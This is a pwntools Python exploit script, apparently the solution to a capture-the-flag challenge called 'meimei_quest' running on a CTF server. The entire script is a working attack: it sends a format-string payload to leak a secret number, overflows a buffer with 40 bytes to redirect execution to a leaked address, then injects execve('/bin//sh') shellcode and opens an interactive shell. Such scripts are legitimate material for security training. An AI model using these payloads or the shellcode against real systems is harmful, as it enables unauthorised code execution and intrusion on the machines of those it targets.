#!/usr/bin/env python3

from pwn import *

context.log_level = 'error'
context.binary = elf = ELF('../src/build/meimei_quest')

HOST = "meimei-quest-7.chall.ctf.bzh"
PORT = 1337

gs = """
b *step3+345
continue
"""

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = gdb.debug(elf.path, gdbscript=gs, cwd="../src/") if args.GDB else process(cwd="../src")

context.log_level = 'info'

io.recvuntil(b'0x')

target = int(io.recvuntil(b'.')[:-1], 16)
info("bao bao number @ " + hex(target))

payload = b'%7$s' + b' '*4 + p64(target)
io.sendlineafter(b'> ', payload)
io.recvuntil(b' : ')

number = io.recv(14)
io.sendlineafter(b'> ', number)

io.recvuntil(b'jump to ')
target = int(io.recvuntil(b',')[:-1], 16)
info("step3 @ " + hex(target))
payload = b'A'*40 + p64(target)

io.sendlineafter(b'> ', payload)

shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
io.sendlineafter(b'shellcode !', shellcode)
io.interactive()
